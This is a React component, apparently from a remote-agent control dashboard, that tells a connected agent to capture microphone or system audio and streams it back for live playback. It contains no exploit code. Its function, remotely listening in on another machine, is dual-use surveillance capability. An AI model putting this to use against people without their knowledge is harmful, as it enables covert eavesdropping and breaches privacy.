import React, { useState, useEffect, useRef } from 'react';
import { Mic, Volume2, Play, Square, Settings, Activity, Radio } from 'lucide-react';
import { WS_BASE_URL } from '../../config';

export default function AudioTap({ agentId }) {
    const [mode, setMode] = useState('mic'); // 'mic' or 'sys'
    const [devices, setDevices] = useState([]);
    const [selectedDevice, setSelectedDevice] = useState(0);
    const [streaming, setStreaming] = useState(false);
    const [volume, setVolume] = useState(1.0);
    const [visData, setVisData] = useState(new Uint8Array(20).fill(0));

    const wsRef = useRef(null);
    const audioCtxRef = useRef(null);
    const gainNodeRef = useRef(null);
    const nextStartTimeRef = useRef(0);

    useEffect(() => {
        const ws = new WebSocket(`${WS_BASE_URL}/ws/${agentId}`);
        ws.binaryType = 'arraybuffer';
        wsRef.current = ws;

        ws.onopen = () => {
            console.log("[Audio] Connected");
            ws.send("__LIST_AUDIO_DEVS__");
        };

        ws.onmessage = (event) => {
            if (event.data instanceof ArrayBuffer) {
                const data = new Uint8Array(event.data);
                if (data[0] === 0x02) {
                    const audioData = event.data.slice(1);
                    playPcm(audioData);
                    setVisData(new Uint8Array(audioData).slice(0, 20));
                } else {
                    const text = new TextDecoder().decode(data);
                    if (text.startsWith("AUDIO_DEVS:")) {
                        const raw = text.substring(11);
                        const list = raw.split(';').filter(x => x).map(item => {
                            const parts = item.split(':');
                            if (parts.length >= 3) {
                                return { type: parts[0], id: parseInt(parts[1]), name: parts[2] };
                            }
                            return null;
                        }).filter(x => x);
                        setDevices(list);
                    }
                }
            }
        };

        return () => {
            if (ws.readyState === WebSocket.OPEN) ws.close();
            if (audioCtxRef.current) audioCtxRef.current.close();
        };
    }, [agentId]);

    const playPcm = (arrayBuffer) => {
        if (!audioCtxRef.current) initAudio();
        const ctx = audioCtxRef.current;
        const int16 = new Int16Array(arrayBuffer);
        
        // Mic is Mono (1ch), System is Stereo (2ch) to fix capture issues
        const channels = mode === 'sys' ? 2 : 1;
        const frameCount = int16.length / channels;
        
        const buffer = ctx.createBuffer(channels, frameCount, ctx.sampleRate);
        
        for (let channel = 0; channel < channels; channel++) {
            const channelData = buffer.getChannelData(channel);
            for (let i = 0; i < frameCount; i++) {
                // De-interleave: int16 stores [L, R, L, R...] for stereo
                channelData[i] = int16[i * channels + channel] / 32768.0;
            }
        }

        const source = ctx.createBufferSource();
        source.buffer = buffer; source.connect(gainNodeRef.current);
        const now = ctx.currentTime;
        let startAt = Math.max(now, nextStartTimeRef.current);
        source.start(startAt);
        nextStartTimeRef.current = startAt + buffer.duration;
    };

    const initAudio = () => {
        const ctx = new (window.AudioContext || window.webkitAudioContext)({ sampleRate: 48000 });
        const gain = ctx.createGain(); gain.connect(ctx.destination);
        gain.gain.value = volume; audioCtxRef.current = ctx; gainNodeRef.current = gain;
        nextStartTimeRef.current = ctx.currentTime + 0.05;
    };

    const startStream = () => {
        if (!wsRef.current) return;
        setStreaming(true);
        const devId = isNaN(selectedDevice) ? 0 : selectedDevice;
        if (mode === 'mic') wsRef.current.send(`__START_AUDIO_MIC__:${devId}`);
        else wsRef.current.send(`__START_AUDIO_SYS__:${devId}`);
    };

    const stopStream = () => {
        if (!wsRef.current) return;
        setStreaming(false);
        if (mode === 'mic') wsRef.current.send("__STOP_AUDIO_MIC__");
        else wsRef.current.send("__STOP_AUDIO_SYS__");
    };

    const filteredDevices = devices.filter(d => mode === 'mic' ? d.type === 'C' : d.type === 'P');

    return (
        <div className="flex flex-col h-full bg-[#0c0c0c] font-mono">
            {/* Top Toolbar - Screen Stream style */}
            <div className="bg-[#1a1a1a] border-b border-[#333] p-2 flex items-center gap-6 shadow-md z-10 flex-wrap">
                <div className="flex gap-2 border-r border-[#333] pr-6">
                    {!streaming ? (
                        <button onClick={startStream} className="flex items-center gap-1 px-4 py-1.5 rounded-sm text-xs font-bold bg-red-900/20 text-red-400 hover:bg-red-500 hover:text-white transition">
                            <Radio size={14} className="animate-pulse" /> START REC
                        </button>
                    ) : (
                        <button onClick={stopStream} className="flex items-center gap-1 px-4 py-1.5 rounded-sm text-xs font-bold bg-[#333] text-white hover:bg-red-600 transition">
                            <Square size={12} fill="currentColor" /> STOP REC
                        </button>
                    )}
                </div>

                <div className="flex items-center gap-4 border-r border-[#333] pr-6">
                    <div className="flex items-center gap-2 bg-[#111] p-1 rounded border border-[#333]">
                        <button onClick={() => { setMode('mic'); if(streaming) stopStream(); }} className={`px-3 py-1 rounded text-[10px] font-bold transition ${mode === 'mic' ? 'bg-orange-500 text-black' : 'text-gray-500 hover:text-gray-300'}`}>MIC</button>
                        <button onClick={() => { setMode('sys'); if(streaming) stopStream(); }} className={`px-3 py-1 rounded text-[10px] font-bold transition ${mode === 'sys' ? 'bg-orange-500 text-black' : 'text-gray-500 hover:text-gray-300'}`}>SYSTEM</button>
                    </div>
                    
                    <div className="flex items-center gap-2">
                        <span className="text-[10px] text-gray-500 uppercase font-bold tracking-widest">Device:</span>
                        <select value={selectedDevice} onChange={(e) => setSelectedDevice(parseInt(e.target.value))} className="bg-[#111] border border-[#333] rounded px-2 py-1 text-[10px] text-orange-400 outline-none min-w-[150px] cursor-pointer">
                            {filteredDevices.map(d => <option key={`${d.type}-${d.id}`} value={d.id}>{d.name}</option>)}
                            {filteredDevices.length === 0 && <option value="0">Default Device</option>}
                        </select>
                    </div>
                </div>

                <div className="flex items-center gap-4">
                    <div className="flex items-center gap-3">
                        <Volume2 size={14} className="text-gray-500" />
                        <input type="range" min="0" max="2" step="0.1" value={volume} onChange={(e) => { const v=parseFloat(e.target.value); setVolume(v); if(gainNodeRef.current) gainNodeRef.current.gain.value = v; }} className="w-24 h-1 bg-[#333] rounded-lg appearance-none cursor-pointer accent-orange-500" />
                        <span className="text-[10px] text-orange-500 font-bold w-8">{(volume * 100).toFixed(0)}%</span>
                    </div>
                </div>
            </div>

            {/* Main Visualizer Area */}
            <div className="flex-1 flex flex-col items-center justify-center p-10 bg-black relative">
                <div className="absolute top-4 left-4 flex items-center gap-2">
                    <div className={`w-2 h-2 rounded-full ${streaming ? 'bg-red-500 animate-ping' : 'bg-gray-700'}`}></div>
                    <span className="text-[10px] text-gray-500 font-bold uppercase tracking-[0.3em]">{streaming ? 'Live Transmission' : 'Signal Idle'}</span>
                </div>

                <div className="flex items-end gap-1.5 h-48 w-full max-w-2xl justify-center border-b border-[#222] pb-2">
                    {Array.from(visData).map((v, i) => (
                        <div key={i} className="flex-1 bg-gradient-to-t from-orange-600 to-orange-400 rounded-t-sm transition-all duration-75" 
                             style={{ height: `${streaming ? Math.max(5, (v % 100)) : 2}%`, opacity: streaming ? 1 : 0.1 }}>
                        </div>
                    ))}
                </div>
                
                <div className="mt-8 flex flex-col items-center gap-2">
                    <p className="text-[10px] text-gray-600 font-bold tracking-[0.5em] uppercase">Frequency Spectrum</p>
                    <div className="flex gap-8 mt-4 text-gray-500">
                        <div className="flex flex-col items-center"><span className="text-xs text-orange-500 font-bold">{streaming ? '48.0' : '0.0'}</span><span className="text-[8px] uppercase tracking-widest">kHz</span></div>
                        <div className="flex flex-col items-center"><span className="text-xs text-orange-500 font-bold">{streaming ? '16' : '0'}</span><span className="text-[8px] uppercase tracking-widest">bit</span></div>
                        <div className="flex flex-col items-center"><span className="text-xs text-orange-500 font-bold">{mode === 'mic' ? 'Mono' : 'Stereo'}</span><span className="text-[8px] uppercase tracking-widest">Input</span></div>
                    </div>
                </div>
            </div>
        </div>
    );
}